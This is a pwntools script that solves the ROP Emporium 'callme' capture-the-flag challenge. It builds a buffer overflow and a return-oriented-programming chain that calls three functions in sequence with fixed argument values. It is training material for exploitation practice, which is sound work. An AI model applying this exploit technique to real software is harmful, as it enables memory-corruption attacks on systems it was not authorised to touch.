# https://ropemporium.com/challenge/callme.html
# pwn0x80.github.io

from pwn import *

buf = b"A"*40
# 0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
gadget = p64(0x40093c)


r = ELF('./callme')

p = process(r.path)

# callme
# call_3 = int(r.symbols.usefulFunction) + 19
# call_2 = call_3 + 20
# call_1 = call_2 + 20


call_1 = int(r.symbols.callme_one)
call_2 = (r.symbols.callme_two)
call_3 = (r.symbols.callme_three)
print(hex(call_1))

print(hex(call_2))

print(hex(call_3))
# trash
rdi = p64(0xdeadbeefdeadbeef)
rsi = p64(0xcafebabecafebabe)
rdx = p64(0xd00df00dd00df00d)

reg = rdi + rsi + rdx
print(reg)
payload = buf + gadget + reg + \
    p64(call_1) + gadget + reg + p64(call_2) + gadget + reg + p64(call_3)
print(payload)

raw_input('gdb mode')


p.sendline(payload)

response = p.recvall()  # gets all messages in the process

print(response.decode())

# a = p.recv()
# print(a)


p.interactive()
